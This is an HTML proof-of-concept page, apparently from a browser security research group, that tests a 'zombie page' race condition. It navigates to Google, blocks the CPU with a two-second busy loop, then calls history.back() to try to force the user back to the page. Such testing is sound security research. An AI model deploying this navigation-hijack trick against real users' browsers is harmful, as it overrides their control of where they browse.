<!DOCTYPE html>
<html>
<head>
    <title>Zombie Page Test - VulnVoyagers</title>
</head>
<body>
    <h1>Zombie Page Race Condition Test</h1>
    <p>Klik tombol di bawah, lalu tunggu 2 detik.</p>
    <button id="start">Mulai Navigasi & Hijack</button>

    <script>
        document.getElementById('start').onclick = () => {
            console.log("[*] Memulai navigasi ke Google...");
            
            // 1. Trigger navigasi ke website lain (Cross-Origin)
            location.href = "https://www.google.com";

            // 2. BUSY-SLEEP: Kita bikin CPU macet selama 2 detik
            // Ini tujuannya nahan proses 'unload' di background
            const start = Date.now();
            while (Date.now() - start < 2000) {
                // Loop kosong buat makan resource CPU
            }

            // 3. THE HIJACK: Setelah navigasi 'seharusnya' selesai, 
            // kita coba perintah history dari halaman yang 'mati' ini.
            setTimeout(() => {
                console.log("[!] Mencoba menarik balik history...");
                // Jika berhasil, meskipun lo udah di Google, 
                // lo bakal dipaksa balik lagi ke halaman ini.
                history.back(); 
            }, 500);
        };
    </script>
</body>
</html>
